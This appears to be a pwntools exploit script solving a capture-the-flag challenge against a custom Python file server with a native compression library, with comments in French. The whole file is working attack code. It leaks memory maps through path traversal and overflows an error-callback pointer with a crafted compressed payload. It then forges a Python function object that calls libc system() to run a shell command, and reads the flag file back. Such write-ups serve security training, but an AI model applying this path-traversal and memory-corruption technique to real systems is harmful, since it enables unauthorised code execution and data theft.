#!/usr/bin/env python3

from pwn import *
import base64
import dis

context.log_level = 'error'
context.binary = elf = ELF('/usr/bin/python3')
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('./libc.so.6') if args.REMOTE else elf.libc

HOST = "127.0.0.1"
PORT = 1337

gs = """
continue
"""
if not args.REMOTE:
    server = gdb.debug([elf.path, '../sources/chall.py'], gdbscript=gs) if args.GDB else process([elf.path, '../sources/chall.py'])

def get_conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return remote("127.0.0.1", 1337)

context.log_level = 'info'

# wait for server to wake
if args.GDB:
    input("enter when gdb is ready")
else:
    sleep(0.1)

io = get_conn()

io.sendline(b'RETR ../../../../../proc/self/maps')
io.recvuntil(b'OK\n')

# ===== EXTRACT LEAKS FROM PATH TRAVERSAL =====
data = base64.b64decode(io.recvline())
grab_next = False
leak_lib = 0
for line in data.split(b'\n'):
    if libc.address == 0 and b'libc' in line:
        libc.address = int(line[:line.index(b'-')], 16)

    if leak_lib == 0 and b'cool_compress.so' in line:
        leak_lib = int(line[:line.index(b'-')], 16) 

# =============================================

info("compress lib @ " + hex(leak_lib))
info("libc @ " + hex(libc.address))

# On peut calculer la position de l'array utilisée pour les calculs où notre overflow apparaît à partir du leak
ptr_arr = leak_lib + 0x41a0

# On va overflow exactement le pointeur err_callback pour le rediriger vers le début de notre buffer pour créer
# une fausse structure type PyObject

payload = b"\xffA"*32 + b'\x20B'
for b in pack(ptr_arr):
    payload += b'\x01' + b.to_bytes()
payload = base64.b64encode(payload)

io.sendline(b'PUT payload.cc ' + payload)
io.sendline(b'DCMPR payload.cc')

# A partir de maintenant, err_callback a été écrasé par l'addresse de notre buffer
# Il suffit donc de créer une structure d'objet python valide qui correspond à une fonction pour exécuter le bytecode

PyNone = 0xa074f0  if args.REMOTE else 0xa15510
PyFunction_Type = 0x9fce00 if args.REMOTE else 0xa0ae20
vectorcall = libc.sym["system"]

payload = flat({
    # Partie 1 : Fake PyFunctionObject
    # On créer un objet valide qui trigger un vectorcall et redirige vers une instance de 
    # PyCodeObject définie plus loins dans la mémoire (ptr_arr + 0x100) dans le but d'exécuter un bytecode
    # python custom
    0: [
        b'./fl*>w\x00', PyFunction_Type, # function type
        0, 0,
        0, 0, 0,
        0, 0, 0, # stay null
        PyNone,
        0, 0, # stay null
        0xa484f8 if args.REMOTE else 0xa56658, 
        0, 0, # stay null
        vectorcall, # null vectorcall to avoid using vectorcall !
        p32(0x321), p32(0)
    ], 
}, filler=b'\x00')

def compress(data: bytes):
    res = b""
    prev = data[0]
    count = 1
    for i in range(1, len(data)):
        if prev == data[i] and count < 255:
            count += 1
        else:
            res += count.to_bytes()
            res += prev.to_bytes()
            count = 1
            prev = data[i]

    res += count.to_bytes()
    res += prev.to_bytes()
    return res


payload = base64.b64encode(compress(payload))

io.sendline(b'PUT test.cc ' + payload)
sleep(0.1)
io.sendline(b'DCMPR test.cc')


io.sendline(b'PUT trigger.cc YQ==')
sleep(0.1)
io.sendline(b'DCMPR trigger.cc')
io.close()

# we need to reconnect because the call to system will have triggered a crash

info("waiting for command to execute...")
sleep(1)

io = get_conn()
io.recvline()
io.sendline(b'RETR ../../../../../home/ctf/app/w')
io.recvline()
io.recvline()

flag = base64.b64decode(io.recvline().strip()).decode()
success(flag)

io.sendline(b'QUIT')
io.close()

